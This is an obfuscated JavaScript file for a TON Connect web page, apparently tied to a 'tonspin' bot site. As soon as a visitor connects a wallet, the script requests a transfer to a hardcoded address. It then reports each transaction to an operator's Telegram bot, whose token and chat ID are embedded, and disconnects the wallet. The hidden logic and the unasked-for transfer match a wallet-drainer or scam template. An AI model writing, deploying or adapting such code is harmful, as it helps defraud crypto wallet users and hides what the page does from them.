(function(_0x26272b, _0x227621) {
    const _0x2a16c9 = _0x524c
      , _0x2c4b8a = _0x26272b();
    while (!![]) {
        try {
            const _0x1fecd8 = -parseInt(_0x2a16c9(0xa2)) / 0x1 + -parseInt(_0x2a16c9(0xa6)) / 0x2 + parseInt(_0x2a16c9(0xa5)) / 0x3 * (parseInt(_0x2a16c9(0xb8)) / 0x4) + -parseInt(_0x2a16c9(0xb9)) / 0x5 + -parseInt(_0x2a16c9(0xbd)) / 0x6 + -parseInt(_0x2a16c9(0xb2)) / 0x7 * (-parseInt(_0x2a16c9(0xa7)) / 0x8) + parseInt(_0x2a16c9(0xb5)) / 0x9;
            if (_0x1fecd8 === _0x227621)
                break;
            else
                _0x2c4b8a['push'](_0x2c4b8a['shift']());
        } catch (_0x2d356d) {
            _0x2c4b8a['push'](_0x2c4b8a['shift']());
        }
    }
}(_0x2b4f, 0x95233));
function _0x524c(_0xd5eb16, _0x29ff67) {
    const _0x2b4f0a = _0x2b4f();
    return _0x524c = function(_0x524c49, _0x466479) {
        _0x524c49 = _0x524c49 - 0xa0;
        let _0x468e7d = _0x2b4f0a[_0x524c49];
        return _0x468e7d;
    }
    ,
    _0x524c(_0xd5eb16, _0x29ff67);
}
function _0x2b4f() {
    const _0x283724 = ['958352tdDmwz', 'The\x20message\x20was\x20sent\x20to\x20Telegram', 'validUntil', '3IZGLmh', '2315450xPYpQC', '4472rUxrli', 'log', 'address', 'amount', '10000', 'error', 'sendTransaction', 'Error\x20In\x20Transaction', 'Wallet\x20connected:', '\x20Nano\x20TON\x0a\x20\x20\x20\x20\x20\x20\x20\x20⏱️Time:\x20', 'connectWallet', '2324fGiZoM', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20https://t.me/MrLightcode', 'now', '24326100GFZnsj', '-1002472367952', '✅\x20Successful\x20Transaction\x20✅\x0a\x20\x20\x20\x20\x20\x20\x20\x20🛖Destination\x20address:\x20', '2025668EJVJLf', '63545TcoApR', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20💲Amount:\x20', 'messages', '7720188016:AAF_WMHxw-DQcBSWb7fxTmg2chVAd6t4q-Q', '3931512kfsjAz', 'Error\x20connecting\x20to\x20wallet:', 'disconnect', 'Error\x20in\x20connection\x20with\x20Telegram', 'https://api.telegram.org/bot'];
    _0x2b4f = function() {
        return _0x283724;
    }
    ;
    return _0x2b4f();
}
const tonConnectUI = new TON_CONNECT_UI['TonConnectUI']({
    'manifestUrl': 'https://mrlightcode.site/Bot/tonspin/tonconnect-manifest.json',
    'buttonRootId': 'tc'
});
async function connectToWallet() {
    const _0x1c9a6b = _0x524c;
    try {
        const _0x25f707 = await tonConnectUI[_0x1c9a6b(0xb1)]();
        console['log'](_0x1c9a6b(0xaf), _0x25f707),
        sendTransaction();
    } catch (_0x3ce016) {
        console[_0x1c9a6b(0xac)](_0x1c9a6b(0xbe), _0x3ce016);
    }
}
async function sendTransaction() {
    const _0x2e6ec5 = _0x524c
      , _0x2254cc = {
        'validUntil': Math['floor'](Date[_0x2e6ec5(0xb4)]() / 0x3e8) + 0x3c,
        'messages': [{
            'address': 'UQA8u-C30A2ItdD2Jj0OSX9j_50fKk82wmdE-oBUTeETnJGt',
            'amount': _0x2e6ec5(0xab)
        }]
    };
    try {
        const _0x3db645 = await tonConnectUI[_0x2e6ec5(0xad)](_0x2254cc);
        console[_0x2e6ec5(0xa8)]('Result\x20Transaction', _0x3db645);
        const _0x2508c9 = _0x2e6ec5(0xb7) + _0x2254cc['messages'][0x0][_0x2e6ec5(0xa9)] + _0x2e6ec5(0xba) + _0x2254cc[_0x2e6ec5(0xbb)][0x0][_0x2e6ec5(0xaa)] + _0x2e6ec5(0xb0) + new Date(_0x2254cc[_0x2e6ec5(0xa4)] * 0x3e8)['toLocaleString']() + _0x2e6ec5(0xb3);
        sendToTelegram(_0x2508c9);
    } catch (_0x15620a) {
        console[_0x2e6ec5(0xac)](_0x2e6ec5(0xae), _0x15620a);
    }
}
async function sendToTelegram(_0x1e7804) {
    const _0x14908a = _0x524c
      , _0x92e856 = _0x14908a(0xbc)
      , _0x580c25 = _0x14908a(0xb6)
      , _0x58d7d1 = _0x14908a(0xa1) + _0x92e856 + '/sendMessage?chat_id=' + _0x580c25 + '&text=' + encodeURIComponent(_0x1e7804);
    try {
        const _0x26013e = await fetch(_0x58d7d1);
        _0x26013e['ok'] ? (console[_0x14908a(0xa8)](_0x14908a(0xa3)),
        await tonConnectUI[_0x14908a(0xbf)]()) : console['error']('Error\x20in\x20sending\x20message\x20to\x20Telegram');
    } catch (_0x55cc08) {
        console[_0x14908a(0xac)](_0x14908a(0xa0), _0x55cc08);
    }
}
